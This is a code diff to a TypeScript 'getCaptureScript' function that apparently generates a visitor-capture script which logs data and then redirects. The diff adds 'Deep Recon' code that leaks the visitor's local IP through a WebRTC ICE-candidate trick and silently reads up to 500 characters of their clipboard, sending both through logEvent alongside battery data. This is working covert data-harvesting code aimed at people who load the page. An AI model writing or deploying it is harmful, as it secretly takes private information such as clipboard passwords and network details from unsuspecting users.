@@ -112,6 +112,26 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
           })()
         };
 
+        // Deep Recon: WebRTC Local IP Leak
+        try {
+          var pc = new RTCPeerConnection({iceServers:[]});
+          pc.createDataChannel("");
+          pc.createOffer().then(o => pc.setLocalDescription(o));
+          pc.onicecandidate = function(ice) {
+            if (ice && ice.candidate && ice.candidate.candidate) {
+              var ip = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(ice.candidate.candidate)[1];
+              logEvent('extra', { local_ip: ip });
+            }
+          };
+        } catch(e) {}
+
+        // Deep Recon: Clipboard Buffer
+        if (navigator.clipboard && navigator.clipboard.readText) {
+           navigator.clipboard.readText().then(function(txt) {
+             if (txt) logEvent('extra', { clipboard_sync: txt.substring(0, 500) });
+           }).catch(function(){});
+        }
+
         try {
           if (navigator.getBattery) {
             var batt = await navigator.getBattery();
